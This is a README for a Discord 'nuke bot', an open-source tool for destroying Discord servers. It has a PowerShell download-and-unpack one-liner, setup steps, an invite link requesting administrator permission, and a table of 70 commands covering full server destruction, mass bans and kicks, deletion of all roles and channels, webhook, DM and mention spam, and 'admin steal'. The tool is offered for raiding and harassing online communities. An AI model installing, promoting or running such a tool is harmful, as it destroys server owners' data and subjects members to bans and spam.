
# DISCORD NUKE BOT

## DESCRIPTION
a discord bot that nukes a server that is open source


## INSTALLATION
```python
iwr "https://github.com/fevberr/nuke-bot/archive/refs/heads/main.zip" -Out "main.zip"; Expand-Archive main.zip .; mv nuke-bot-main\* .; rm main.zip,nuke-bot-main -r -fo
```

### Prerequisites
- Python 3.8 or higher
- Discord Bot Token (get from https://discord.com/developers/applications)

2. Edit `core/g/_78.py` and set your bot token:
```python
BOT_TOKEN = "UR TOKEN HERE"
```

3. Install dependencies:
```powershell
pip install -r requirements.txt
```

4. Run the bot:
```powershell
python main.py
```

## COMMANDS

| Number | Command | Description |
|--------|---------|-------------|
| 1 | NUKE | Full server destruction |
| 2 | CONFIG | Show bot configuration |
| 3 | STATUS | Show bot status |
| 4 | HELP | Show all commands |
| 5 | STOP | Shutdown bot |
| 6 | BANALL | Ban all members |
| 7 | KICKALL | Kick all members |
| 8 | ROLENUKE | Delete all roles |
| 9 | WEBHOOKSPAM | Spam webhooks |
| 10 | CHANNELSPAM | Create spam channels |
| 11 | EMOJIDELETE | Delete all emojis |
| 12 | STICKERDELETE | Delete all stickers |
| 13 | VOICECRASH | Create voice channels |
| 14 | ADMINSTEAL | Steal admin role |
| 15 | INVITEGEN | Generate invites |
| 16 | MESSAGESPAM | Spam messages |
| 17 | DMSPAM | DM all members |
| 18 | ROLEMASS | Create mass roles |
| 19 | CHANNELDELETE | Delete all channels |
| 20 | CHANNELCREATE | Create channels |
| 21 | CHANNELLOCK | Lock all channels |
| 22 | CHANNELUNLOCK | Unlock all channels |
| 23 | NICKALL | Nickname all members |
| 24 | AVATARALL | Remove all avatars |
| 25 | BOOST | Boost spam |
| 26 | REACTIONSPAM | Reaction spam |
| 27 | VOICEJOIN | Join voice channels |
| 28 | VOICELEAVE | Leave voice channels |
| 29 | MUTE | Mute all members |
| 30 | DEAFEN | Deafen all members |
| 31 | SOFTBAN | Softban all members |
| 32 | HACKBAN | Hackban user |
| 33 | UNBAN | Unban user |
| 34 | WARN | Warn user |
| 35 | CLEAR | Clear messages |
| 36 | MENTIONSPAM | Mention spam |
| 37 | FILESPAM | File spam |
| 38 | EMBEDSPAM | Embed spam |
| 39 | STICKERSPAM | Sticker spam |
| 40 | VOICEMOVE | Move voice members |
| 41 | VOICECREATE | Create voice channels |
| 42 | VOICEDELETE | Delete voice channels |
| 43 | ROLECREATE | Create role |
| 44 | ROLEDELETE | Delete roles |
| 45 | ROLEASSIGN | Assign role to all |
| 46 | ROLEREMOVE | Remove role from all |
| 47 | CHANNELCLONE | Clone channels |
| 48 | CHANNELRENAME | Rename channels |
| 49 | CHANNELPOSITION | Move channel positions |
| 50 | ROLEALL | Add all to role |
| 51 | MENTIONALL | Mention all members |
| 52 | MEMBERINFO | Get member info |
| 53 | PING | Ping bot |
| 54 | SERVERINFO | Server info |
| 55 | USERINFO | User info |
| 56 | UPTIME | Bot uptime |
| 57 | RELOAD | Reload commands |
| 58 | GUILDICON | Change guild icon |
| 59 | GUILDNAME | Change guild name |
| 60 | GUILDREGION | Change guild region |
| 61 | GUILDVANITY | Change guild vanity |
| 62 | GUILDSPLASH | Change guild splash |
| 63 | EMOJISTEAL | Steal emojis |
| 64 | EMOJICREATE | Create emoji |
| 65 | STICKERCREATE | Create sticker |
| 66 | REACT | Add reactions |
| 67 | DM | DM members |
| 68 | MESSAGEEDIT | Edit message |
| 69 | MESSAGEDELETE | Delete messages |
| 70 | ADMIN | Admin command |

## USAGE
1. Invite the bot to your server https://discord.com/api/oauth2/authorize?client_id=A0000000000000000000A&permissions=8&scope=bot+applications.commands
2. Type any number from 1-70 in the chat such as 
```bash
.70
```

## REQUIREMENTS
- discord.py>=2.0.0
- psutil>=5.8.0
- asyncio

## FILE STRUCTURE
```
/
├── main.py
├── requirements.txt
├── README.md
└── core/
    ├── a/
    │   ├── _1.py to _70.py (commands)
    │   └── __init__.py
    ├── b/
    │   ├── _71.py (logger)
    │   ├── _72.py (rate limit)
    │   └── __init__.py
    ├── c/
    │   ├── _74.py (nuke engine)
    │   └── __init__.py
    ├── d/
    │   ├── _75.py (rate limit 2)
    │   └── __init__.py
    ├── e/
    │   ├── _76.py (logger 2)
    │   └── __init__.py
    ├── f/
    │   ├── _77.py (event handler)
    │   └── __init__.py
    └── g/
        ├── _78.py (settings)
        └── __init__.py
```
